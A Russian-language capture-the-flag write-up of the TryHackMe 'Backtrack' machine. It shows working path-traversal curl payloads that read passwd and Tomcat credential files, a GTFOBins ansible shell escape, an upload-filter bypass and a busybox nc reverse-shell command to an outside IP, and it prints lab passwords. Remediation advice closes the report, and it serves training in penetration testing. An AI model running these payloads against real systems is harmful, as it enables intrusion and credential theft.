# Отчёт о прохождении машины Backtrack (TryHackMe)

**Цель:** получение всех флагов и полный разбор цепочки эксплуатации.
**Итог:** машина пройдена полностью — получены три флага (flag1 — пользователь tomcat, flag2 — пользователь orville, flag3 — root).


## 1. Разведка (nmap)

```
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
|_  256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.93
| http-methods:
|_  Supported Methods: GET HEAD POST
8888/tcp open  sun-answerbook?
```

На порту 8080 — Apache Tomcat 8.5.93. На порту 8888 — сервис, определённый nmap как `sun-answerbook?` (на деле — Aria2 WebUI). SSH открыт.

## 2. Исследование и фаззинг директорий 8080

```
Apache Tomcat/8.5.93
docs                 (Status: 403) [Size: 877]
examples             (Status: 403) [Size: 865]
favicon.ico          (Status: 200) [Size: 21630]
host-manager         (Status: 401) [Size: 2044]
manager              (Status: 401) [Size: 2499]
```

Ничего интересного напрямую — `manager` и `host-manager` требуют аутентификации.

## 3. Исследование 8888 — aria2webui и CVE-2023-39141

На порту 8888 обнаружен **aria2webui** — веб-фреймворк для удобной работы с Aria2 (загрузчик файлов).

Фаззинг скрытых директорий и файлов:

```
flags                (Status: 500) [Size: 82]
```

Обнаружена **CVE-2023-39141** — path traversal, позволяющая читать файлы с сервера.

Payload:

```bash
curl --path-as-is 'http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd'
```

Ответ (фрагмент):

```
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:122:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```

Получены пользователи: `tomcat`, `orville`, `wilbur`.

## 4. Поиск интересных файлов через path traversal

Чтение `/proc/net/tcp`:

```
 sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:0CEA 00000000:0000 0A ...   113        0 23923 ...
   1: 0100007F:0050 00000000:0000 0A ...     0        0 22493 ...
   2: 00000000:1A90 00000000:0000 0A ...  1002        0 22409 ...
   3: 3500007F:0035 00000000:0000 0A ...   101        0 18118 ...
   4: 00000000:0016 00000000:0000 0A ...     0        0 22225 ...
   5: 0100007F:8124 00000000:0000 0A ...   113        0 23905 ...
   6: 28B1430A:1A90 FA93A8C0:ADA6 01 ...  1002        0 26746 ...
   7: 0100007F:0016 0100007F:9710 01 ...     0        0 31809 ...
   8: 0100007F:9710 0100007F:0016 01 ...     0        0 31808 ...
   9: 0100007F:8A94 0100007F:0016 06 ...     0        0 0 ...
  10: 28B1430A:9F26 C1A3430A:01BB 01 ...     0        0 23610 ...
```

Задействованные порты:

```
40742
35476
38672
22
6800 (исходя из документации aria2webui — RPC)
33060
53
80
3306
```

Обнаружены IP-адреса хостов:

```
IP address       HW type     Flags       HW address            Mask     Device
10.67.163.193    0x1         0x2         12:79:b9:06:72:7b     *        eth0
10.67.188.169    0x1         0x2         12:02:bc:fa:b7:3d     *        eth0
10.67.128.1      0x1         0x2         12:18:52:dd:3c:f5     *        eth0
10.67.165.1      0x1         0x2         12:82:12:96:0a:c5     *        eth0
```

Из `.sshd`:

```
PasswordAuthentication yes
PermitRootLogin yes
```

Из hosts:

```
127.0.1.1       ubuntu-focal    ubuntu-focal
127.0.2.1       Backtrack       Backtrack
```

## 5. Попытки эксплуатации загрузки файлов через Aria2 (неудачные)

В интерфейсе есть функционал скачивания файла по URL.

```
10.67.177.40 - - [12/Nov/2026 04:48:54] code 404, message File not found
10.67.177.40 - - [12/Nov/2026 04:48:54] "GET /test.html HTTP/1.1" 404 -
```

Попытки:

- Загрузить webshell и cmd.php — **файл не исполняется**.
- **Aria2 Arbitrary File Write Vulnerability** — в конфиге можно указать, куда грузить файлы. Попытка загрузить конфиг в `/etc/cron.d` и revshell в `/tmp` — **не сработало**, так как приложение запущено не от root, и cron-задача не выполнится.

## 6. Чтение конфигов через path traversal — креды Tomcat

Найден домашний каталог tomcat и файл `tomcat-users.xml`.

```bash
curl --path-as-is 'http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../proc/self/environ' --output -
LANG=C.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/opt/tomcat
LOGNAME=tomcat
USER=tomcat
INVOCATION_ID=e931923a526a4ab4a11a5e0bc742fa6b
JOURNAL_STREAM=9:20228
```

```bash
curl --path-as-is 'http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml'
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>

</tomcat-users>
```

Успешный вход с этими кредами: `http://backtrack.thm:8080/manager/status`.

Через **tomcat_rce** (питоновский скрипт) получен shell от `tomcat`.

**Флаг 1:** `/opt/tomcat/flag1.txt` — получен.

## 7. Эскалация привилегий tomcat → wilbur

```
User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```

В GTFOBins найдена shell-команда:

```bash
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /path/to/temp-file
ansible-playbook /path/to/temp-file
```

Эксплуатация Backtrack:

```bash
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../../tmp/shell.yml
id
uid=1004(wilbur) gid=1004(wilbur) groups=1004(wilbur)
```

Ключевой момент: **glob `*.yml` в sudo-правиле позволяет обойти каталог через `../../../`** и запустить произвольный playbook из `/tmp`.

### Дополнительные попытки (неудачные)

- **Подмена PATH через `secure_path`** — проверка `ls -ld /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /snap/bin` показала, что все каталоги принадлежат `root:root` с правами `drwxr-xr-x`, запись для `tomcat` невозможна. `/snap/bin` вообще отсутствует. Подмена `netstat`/`grep` в `/usr/local/sbin` невозможна.
- **`-e 'ansible_python_interpreter=/tmp/fake_python'`** — sudo требует пароль, так как правило валидирует только первые два аргумента (бинарник + путь к playbook), а `-e` идёт после и не разрешён.
- **`ansible.cfg` в `/tmp`** и **`-i /tmp/hosts`** — не потребовались, так как сработал обход через `../../../`.

## 8. Эскалация wilbur → orville

Найдено сообщение от orville:

```bash
cat from_orville.txt
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$
```

На 80 порту найдено приложение:

```bash
wilbur@Backtrack:~$ curl http://127.0.0.1
<!DOCTYPE html>
<html>
<head>
    <title>Home</title>
</head>
<body>
    <link rel="stylesheet" href="css/bootstrap.min.css">

<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">Orville's Gallery</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item">
          <a class="nav-link" aria-current="page" href="index.php">Home</a>
        </li>

                    <li class="nav-item">
          <a class="nav-link" href="login.php">Login</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="register.php">Register</a>
        </li>

      </ul>
    </div>
</nav>
            <h1 style="text-align:center;margin-top: 30px;">Welcome to my image gallery</h1>
        <p style="text-align:center;margin-top: 15px;">Login and start uploading images!</p>
    </body>
</html>
```

Прокинут 80-й порт через SSH для удобства взаимодействия с веб-приложением:

```bash
ssh -L 80:127.0.0.1:80 wilbur@backtrack.thm -i id_rsa -N
```

Авторизация с найденными кредами:

```
email : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$
```

В дашборде присутствует возможность загрузки картинок. Ограничение: «Only JPG, JPEG, PNG, and GIF files are allowed».

### Перебор способов обхода фильтра

| Способ | Результат |
|---|---|
| Двойное расширение `.php.jpg` | ❌ не сработало |
| Null-byte `.php%00.jpg` | ❌ не сработало |
| Изменение магических байтов | ❌ не сработало |
| Внедрение в Copyright Notice: `exiftool beef.jpg -CopyrightNotice='<?=`$_GET[c]`?>'` | ❌ не сработало |
| Добавление `GIF89a` в начало php-файла | ❌ не сработало |
| **Загрузка `webshell.jpg.php` + path traversal в имени файла с двойным кодированием `../` → `%252E%252E%252F`** | ✅ сработало |

Удалось загрузить файл `webshell.jpg.php` и использовать path traversal в имени файла с двойным кодированием `../` → `%252E%252E%252F`. Выполнена команда `whoami` → `orville`.

Получен шелл с помощью payload:

```bash
curl -s -X POST 'http://127.0.0.1/uploads/../webshell.jpg.php?feature=shell' \
  --data-urlencode 'cmd=busybox nc 192.168.193.110 5555 -e sh'
```

## 9. Shell orville

Получен шелл `orville`. Найден архив, содержащий все файлы веба:

```bash
orville@Backtrack:~$ unzip web_snapshot.zip
Archive:  web_snapshot.zip
   creating: var/www/html/css/
  inflating: var/www/html/css/bootstrap.min.css
  inflating: var/www/html/css/style.css
  inflating: var/www/html/dashboard.php
   creating: var/www/html/includes/
  inflating: var/www/html/includes/db.php
  inflating: var/www/html/index.php
  inflating: var/www/html/login.php
  inflating: var/www/html/logout.php
  inflating: var/www/html/navbar.php
  inflating: var/www/html/register.php
   creating: var/www/html/uploads/
  inflating: var/www/html/uploads/webshell.jpg.php
  inflating: var/www/html/uploads/beef.jpg
  inflating: var/www/html/webshell.jpg.php
 extracting: var/www/html/uploads/cmd.jpg.php
 extracting: var/www/html/cmd.jpg.php
```

**Флаг 2** (orville) — получен.

## 10. Эскалация до root

Из `db.php` получен пароль БД:

```
/home/orville/var/www/html/includes/db.php:$password = '3uK32VD7YRtVHsrehoA3';
/var/www/html/includes/db.php:$password = '3uK32VD7YRtVHsrehoA3';
```

Креды **не подошли** для SSH/`su`. Подключение к базе под пользователем orville:

```php
$host = 'localhost';
$dbname = 'backtrack';
$username = 'orville';
$password = '3uK32VD7YRtVHsrehoA3';
```

Хэш: `orville:$2y$10$dMzyvDTFnUPr.os1ZdWt1.oM4mUeZvH3OtcgJrww/QrD3o1Eb9XNW` — также не подошёл.

### Обнаружение root-активности через pspy

Через запуск `pspy64` замечено, что root подключается, переключается на пользователя orville и архивирует:

```
CMD: UID=0     PID=23320  | sshd: root@pts/0
CMD: UID=1003  PID=23333  | -bash
CMD: UID=1003  PID=23342  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/rev.png.php /var/www/html/uploads
```

**Вывод:** root периодически заходит по SSH, делает `su - orville` и запускает `zip` для снапшота сайта. Это не cron-задача, а ручное обслуживание, которое ловится только `pspy`.

### Эксплуатация через `.bashrc`

В `.bashrc` добавлено:

```bash
echo 'cp /root/flag3.txt /tmp/root.txt; chmod 644 /tmp/flag3.txt' >> .bashrc
```

Когда root в следующий раз зашёл как `orville`, `.bashrc` выполнился от имени root, и `flag3.txt` скопировался в `/tmp/flag3.txt` с правами `644`.

**Флаг 3 (root)** — получен.


## Ключевые уязвимости и неправильные конфигурации

1. **CVE-2023-39141** в aria2webui — path traversal для чтения файлов.
2. **Пароли Tomcat в открытом виде** в `tomcat-users.xml`, доступном через path traversal.
3. **Чрезмерно широкое sudo-правило** `ansible-playbook /opt/test_playbooks/*.yml` — glob `*` + отсутствие валидации дополнительных аргументов позволяет обойти каталог через `../../../` и запустить произвольный playbook.
4. **Хранение кредов в заметке** `from_orville.txt` в домашнем каталоге wilbur.
5. **Слабая проверка загружаемых файлов** в галерее: обход фильтра расширений через двойное расширение `.jpg.php` + path traversal в имени файла с двойным URL-кодированием.
6. **`php_flag engine off` только в `/uploads/`** — path traversal выводит шелл в корень, где PHP выполняется.
7. **Root выполняет `su - orville`**, читая `.bashrc`, принадлежащий orville, — классический вектор TTY pushback / выполнения кода от root.
8. **`PermitRootLogin yes`** в sshd_config — избыточная поверхность атаки.

## Использованные инструменты

- `nmap`, `ffuf`/`gobuster` (фаззинг)
- `curl` с `--path-as-is` (path traversal)
- `tomcat_rce` (эксплуатация manager-script)
- `pspy64` (мониторинг процессов без root)
- `ssh -L` (проброс портов)
- `exiftool` (попытки внедрения в метаданные — неудачные)
- `busybox nc` (reverse shell)

## Рекомендации по устранению

- Обновить aria2webui до версии без CVE-2023-39141.
- Убрать пароли Tomcat из `tomcat-users.xml` в открытом виде, ограничить роли.
- Сузить sudo-правило: указать конкретные playbook-файлы без glob, либо запретить дополнительные аргументы.
- Не хранить креды в открытом виде в домашних каталогах.
- Ужесточить валидацию загружаемых файлов: проверять MIME, перекодировать изображения, нормализовать имена (`basename()`), запретить `../` и двойное кодирование.
- Не отключать PHP только в `/uploads/` — либо запретить выполнение PHP во всём веб-руте, либо хранить загрузки вне web-root.
- Не выполнять `su - orville` от root без `-P` (новый PTY), либо использовать `sudo` с ограниченным набором команд.
- Установить `PermitRootLogin no`.